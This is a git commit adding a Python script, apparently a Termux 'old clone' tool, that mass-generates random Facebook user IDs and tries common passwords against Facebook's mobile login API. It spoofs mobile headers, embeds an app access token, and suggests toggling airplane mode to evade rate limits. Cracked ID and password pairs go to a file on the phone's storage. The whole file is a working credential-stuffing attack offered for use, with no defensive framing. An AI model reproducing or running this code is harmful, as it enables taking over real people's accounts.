c40006ec331e294872537c43bef41fe10decbf3a
SHAMIM-CYBER <117802658+SHAMIM-CYBER@users.noreply.github.com>
2024-10-15 23:11:33 +0600

    Add files via upload

---
+++ old----8n.py
@@ -0,0 +1,101 @@
+"""@coded_by : shamim hosssen"""
+from concurrent.futures import ThreadPoolExecutor as tred
+import requests,sys
+import time,httpx
+import os
+from os import system as cmd
+from random import randint as rr
+from random import choice as rc
+from string import digits as digits
+import requests
+print('\n \033[1;91m[\033[1;32mSHAMIM\033[1;91m]\033[1;97m installing requests !...\n')
+time.sleep(1.0)
+os.system(' ')
+import bs4,json,sys,random,datetime,time,re,subprocess,platform,struct,requests
+from bs4 import BeautifulSoup as sop
+from concurrent.futures import ThreadPoolExecutor as tred
+import base64
+import os,sys,time,json,random,re,string,platform,base64
+import requests
+from concurrent.futures import ThreadPoolExecutor as ThreadPool
+import mechanize
+from requests.exceptions import ConnectionError
+import string
+try:
+    import concurrent.futures
+except ImportError:
+    print('\n \033[1;91m[\033[1;32mSHAMIM\033[1;91m]\033[1;97m installing futures !...\n')
+    time.sleep(0.5)
+    os.system(' ')
+try:
+    import bs4
+except ImportError:
+    print('\n \033[1;91m[\033[1;32mSHAMIM\033[1;91m]\033[1;97m installing bs4 !...\n')
+    time.sleep(0.5)
+os.system("xdg-open https://youtube.com/@Cyberkingshamim?si=5PXg2Ru0EB9e09MM")
+logo = """\033[0;92m╭━━━┳╮╱╭┳━━━┳━╮╭━┳━━┳━╮╭━╮╱╱╭━━━┳╮╱╱╭┳━━╮╭━━━┳━━━╮
+┃╭━╮┃┃╱┃┃╭━╮┃┃╰╯┃┣┫┣┫┃╰╯┃┃╱╱┃╭━╮┃╰╮╭╯┃╭╮┃┃╭━━┫╭━╮┃
+┃╰━━┫╰━╯┃┃╱┃┃╭╮╭╮┃┃┃┃╭╮╭╮┃╱╱┃┃╱╰┻╮╰╯╭┫╰╯╰┫╰━━┫╰━╯┃
+╰━━╮┃╭━╮┃╰━╯┃┃┃┃┃┃┃┃┃┃┃┃┃┣━━┫┃╱╭╮╰╮╭╯┃╭━╮┃╭━━┫╭╮╭╯
+┃╰━╯┃┃╱┃┃╭━╮┃┃┃┃┃┣┫┣┫┃┃┃┃┣━━┫╰━╯┃╱┃┃╱┃╰━╯┃╰━━┫┃┃╰╮
+╰━━━┻╯╱╰┻╯╱╰┻╯╰╯╰┻━━┻╯╰╯╰╯╱╱╰━━━╯╱╰╯╱╰━━━┻━━━┻╯╰━╯
+                                                                                                              
+\033[1;39m     ┏━━━━━━━━━━━━━━━━━━━\033[38;5;46m𝚂𝙷𝙰𝙼𝙸𝙼\033[1;39m━━━━━━━━━━━━━━━━━━━━━┓
+\033[1;39m      \x1b[1;95m❣︎[𖣘]☔︎\x1b[1;96m𝙉𝘼𝙈𝙀\033[1;34m        : [★] SHAMIM HOSSEN\033[1;39m            
+\033[1;39m      \x1b[1;95m❣︎[𖣘]☔︎\x1b[1;96m𝙁𝘼𝘾𝙀𝘽𝙊𝙊𝙆\033[1;34m    : [★] 𝐓𝐄𝐑𝐌𝐔𝐱 𝐇𝐀𝐂𝐊𝐄𝐑 𝐒𝐇𝐀𝐌𝐈𝐌\033[1;39m   
+\033[1;39m      \x1b[1;95m❣︎[𖣘]☔︎\x1b[1;96m𝙂𝙄𝙏𝙃𝙐𝘽\033[1;34m      : [★] 𝗦𝗛𝗔𝗠𝗜𝗠-𝗖𝗬𝗕𝗘𝗥 \033[1;39m          
+\033[1;39m      \x1b[1;95m❣︎[𖣘]☔︎\x1b[1;96m𝙍𝙄𝙇𝙄𝙂𝙀𝙎𝙃𝙊𝙉\033[1;34m  : [★] 𝗕𝗔𝗡𝗚𝗟𝗔𝗗𝗘𝗦𝗛𝗜\033[1;39m        
+\033[1;39m      \x1b[1;95m❣︎[𖣘]☔︎\x1b[1;96m𝙒𝙃𝘼𝙏𝙎𝘼𝙋𝙋\033[1;34m    : [★] +𝟴𝟴𝟬𝟭𝟴𝟴𝟰𝟮𝟱𝟬𝟬𝟵𝟳\033[1;39m     
+\033[1;39m      \x1b[1;95m❣︎[𖣘]☔︎\x1b[1;96m𝙏𝙊𝙊𝙇𝙎 𝙉𝘼𝙈𝙀\033[1;34m  : [★] OLD-𝐂𝐋𝐎𝐍𝐈𝐍𝐆\033[1;39m     
+\033[1;39m      \x1b[1;95m❣︎[𖣘]☔︎\x1b[1;96m𝙏𝙊𝙊𝙇𝙎 𝙎𝙏𝘼𝙏𝙐𝙎\033[1;34m: [★] 𝗙𝗥𝗘𝗘\033[1;39m               
+ \033[1;39m    ┗━━━━━━━━━━━━━━━━━━━\033[1;31m𝚂𝙷𝙰𝙼𝙸𝙼\033[1;39m━━━━━━━━━━━━━━━━━━━━┛"""
+loop,ok=0,0
+class Shamim:
+    def __init__(self) -> None:
+      self.sex=""
+    def Sh3m(self):
+       self.clear()
+       print("👉\033[1;32m 1. Old Clone 2009-20014\n👉 2. \033[1;32mExit Menu");self.linex()
+       self.frsc=input("👉 Select : ")
+       if self.frsc == "1":self.settings()
+       else:exit("💥 Thanks For Using !")
+    def linex(self):print("---------------------------------------")
+    def clear(self):cmd("clear");print(logo)
+    def settings(self):
+       self.clear();print("👉 \033[1;32mExample : 50000");self.linex()
+       self.limit=int(input("👉 Enter Creak Limit : "));self.user=[]
+       for _ in range(self.limit):nmp = ''.join(rc(digits) for _ in range(10));self.user.append(nmp)
+       with tred(max_workers=30) as kidz:
+           total=str(len(self.user));self.clear()
+           print("\033[1;31m👉 Total Uid : %s"%(total));self.linex()
+           print("\033[1;32m👉 Use Wifi And Data ");self.linex()
+           print("\033[1;32m👉 Version : V/1.9");self.linex()
+           print("\033[1;32m👉 TURN [ON/OFF] AIRPLANE MODE EVERY 3 MIN");self.linex()
+           for xd in self.user:
+               uid=str("10000"+xd);pas=['123456','1234567','12345678','123456789']
+               kidz.submit(self.cracker,uid,pas,total)
+       print();self.linex();print("👉 Cracking Complete \n👉 Total OK : %s"%(ok))
+       self.linex();input("👉 Prees Enter To Exit ");exit()
+    def cracker(self,uid,pas,tl):
+       global loop,ok
+       sys.stdout.write("\r\r👉 \033[1;32mSHAMIM 👉 %s\033[1;32m  OK 👉 %s "%(loop,ok));sys.stdout.flush()
+       try:
+          for ps in pas:
+              with requests.Session() as session:
+                 headers={'x-fb-connection-bandwidth': str(rr(20000000,29999999)),'x-fb-sim-hni': str(rr(20000,40000)),'x-fb-net-hni': str(rr(20000,40000)),'x-fb-connection-quality': 'EXCELLENT','x-fb-connection-type': 'cell.CTRadioAccessTechnologyHSDPA','user-agent': self.ua(),'content-type': 'application/x-www-form-urlencoded','x-fb-http-engine': 'Liger'}
+              po=session.get("https://b-api.facebook.com/method/auth.login?format=json&email="+str(uid)+"&password="+str(ps)+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20¤tly_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true",headers=headers).json()
+              if "Please Confirm Email" in str(po):
+                 print(f"\r\r OK \033[1;32m{uid} | {ps} \033[1;32m");open("/sdcard/Hacker-old-ok.txt",'a').write(str(uid)+"|"+str(ps)+"\n");ok+=1
+                 break
+              elif "session_key" in po:
+                 print(f"\r\r OK \033[1;32m {uid} | {ps} \033[1;32m");open("/sdcard/Hacker-old-ok.txt",'a').write(str(uid)+"|"+str(ps)+"\n");ok+=1
+                 break
+              else:pass
+          loop+=1
+       except Exception as e:pass
+    def ua(self):
+       aa ="Dalvik/2.1.0 (Linux; U; Android 8.0.0; SM-A720F Build/R16NW) [FBAN/Orca-Android;FBAV/196.0.0.29.99;FBPN/com.facebook.orca;FBLC/th_TH;FBBV/135374479;FBCR/Verizon;FBMF/samsung;FBBD/samsung;FBDV/SM-A720F;FBSV/8.0.0;FBCA/armeabi-v7a:armeabi;FBDM/{density=3.0,width=1080,height=1920};FB_FW/1;]"
+       #amr phoner ck 
+       # "Dalvik/2.1.0 (Linux; U; Android 8.0.0; SM-A720F Build/R16NW) [FBAN/Orca-Android;FBAV/196.0.0.29.99;FBPN/com.facebook.orca;FBLC/th_TH;FBBV/135374479;FBCR/Verizon;FBMF/samsung;FBBD/samsung;FBDV/SM-A720F;FBSV/8.0.0;FBCA/armeabi-v7a:armeabi;FBDM/{density=3.0,width=1080,height=1920};FB_FW/1;]"
+       return aa
+Shamim().Sh3m()
